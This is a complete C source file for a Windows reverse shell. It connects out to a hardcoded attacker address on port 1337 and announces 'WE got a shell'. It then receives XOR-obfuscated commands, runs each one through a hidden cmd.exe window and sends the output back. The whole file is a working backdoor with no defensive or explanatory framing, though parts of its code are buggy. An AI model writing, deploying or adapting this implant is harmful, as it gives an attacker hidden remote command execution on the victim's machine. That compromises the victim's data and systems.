#include <winsock2.h>
#include <windows.h>
#include <string.h>
#include <stdio.h>

#pragma warning(disable : 4996)
#pragma comment(lib, "Ws2_32.lib")

char* ExecuteCmdCommand(const char* cmd);
void XOREncDec(char* data, size_t data_len, unsigned char* key, size_t key_len);

#define HOST "192.168.1.7"
#define PORT 1337
unsigned char Key[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08 };

DWORD totalRead;

void MySleep(int ms)
{
	// Convert milliseconds to 100 nanosecond intervals
	const long long intervals = -10000ll * ms;

	// Create a delay object
	const HANDLE delayHandle = CreateWaitableTimer(NULL, TRUE, NULL);
	if (delayHandle == NULL)
	{
		// Handle error
		return;
	}

	// Set the delay object to the desired timeout
	if (!SetWaitableTimer(delayHandle, (const LARGE_INTEGER*)&intervals, 0, NULL, NULL, FALSE))
	{
		// Handle error
		CloseHandle(delayHandle);
		return;
	}

	// Wait for the delay object
	WaitForSingleObject(delayHandle, INFINITE);

	// Clean up
	CloseHandle(delayHandle);
}

int main()
{
	// Initialize Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		printf("Error: WSAStartup failed with error %d\n", WSAGetLastError());
		return 1;
	}

	while (1)
	{
		SOCKET client;
		SOCKADDR_IN addr;
		int addrLen = sizeof(addr);
		int numTries = 0;

		// Connect to the server
		client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (client == INVALID_SOCKET)
		{
			printf("Error: socket failed with error %d\n", WSAGetLastError());
			return 1;
		}

		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(HOST);
		addr.sin_port = htons(PORT);

		while (numTries < 10)
		{
			if (connect(client, (SOCKADDR*)&addr, addrLen) == SOCKET_ERROR)
			{
				printf("Error: connect failed with error %d\n", WSAGetLastError());
				MySleep(10000);
				numTries++;
			}
			else
			{
				break;
			}

			if (numTries == 10)
			{
				printf("Error: Could not connect to the server after %d tries.\n", 10);
				// Close the socket
				closesocket(client);
				// Cleanup Winsock
				WSACleanup();
				return 1;
			}
		}

		// Send a message to the server
		char message[] = "WE got a shell (*.*) ";
		char encrypted[256];
		XOREncDec(message, sizeof(message), Key, sizeof(Key));
		strcpy_s(encrypted,256, message);

		if (send(client, encrypted, strlen(encrypted), 0) == SOCKET_ERROR)
		{
			printf("Error: send failed with error %d\n", WSAGetLastError());
			return 1;
		}

		while (1)
		{
			// Receive a message from the server
			char buffer[256];
			memset(buffer, 0, 256);
			if (recv(client, buffer, 256, 0) == SOCKET_ERROR)
			{
				printf("Error: recv failed with error %d\n", WSAGetLastError());
				return 1;
			}

			char decrypted[256];
			XOREncDec(buffer, strlen(buffer), Key, sizeof(Key));
			strcpy_s(decrypted, 256, buffer);

			// Execute a command
			char* output = ExecuteCmdCommand(decrypted);
			if (output)
			{
				// Send the command output back to the server
				if (send(client, output, totalRead + 1, 0) == SOCKET_ERROR)
				{
					printf("Error: send failed with error %d\n", WSAGetLastError());
					return 1;
				}
				free(output);
			}
		}
		// Close the socket
		closesocket(client);
	}

	// Cleanup Winsock
	WSACleanup();

	return 0;
}

void XOREncDec(char* data, size_t data_len, unsigned char* key, size_t key_len)
{
	for (size_t i = 0; i < data_len; i++)
	{
		data[i] = data[i] ^ (unsigned char)key[i % key_len];
	}
	data[data_len] = '\0';
}

char* ExecuteCmdCommand(const char* cmd)
{
	// Create pipe to read output
	HANDLE hPipeRead, hPipeWrite;
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;
	if (!CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) 
	{ 
		return -1;
	}
	
	// Execute the command
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = hPipeWrite;
	si.hStdError = hPipeWrite;

	char cmdLine[1024] = {0};
	sprintf_s(cmdLine, sizeof(cmdLine), "cmd /C %s", cmd); // For some reason whoami /all will result in process being stuck

	if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
	{
		return -1;
	}
	//Wait for process to finish
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hPipeWrite);

	// Allocate a buffer to hold the output
	char* buffer = (char*)malloc(sizeof(char) * 8192);
	memset(buffer, 0, 8192);

	DWORD read;
	BOOL success;
	totalRead = 0;

	do
	{
		success = ReadFile(hPipeRead, buffer + totalRead, 8192, &read, NULL);

		if (!success)
		{
			free(buffer);
			printf("%d\n", GetLastError());
			return -1;
		}

		// Keep track of how much we've read
		totalRead += read;

		// If we've reached the end of the output, break out of the loop
		if (read > totalRead + 8192)
		{
			// Reallocate the buffer to fit the entire output
			buffer = (char*)realloc(buffer, totalRead + 8192);
		}
		else
		{
			break;
		}

	} while (TRUE);

	CloseHandle(hPipeRead);
	// XOR the buffer
	XOREncDec(buffer, totalRead, Key, sizeof(Key));

	// Copy output to string
	char* output = (char*)malloc(totalRead + 1);
	strcpy_s(output, totalRead + 1, buffer);
	free(buffer);

	return output;
}
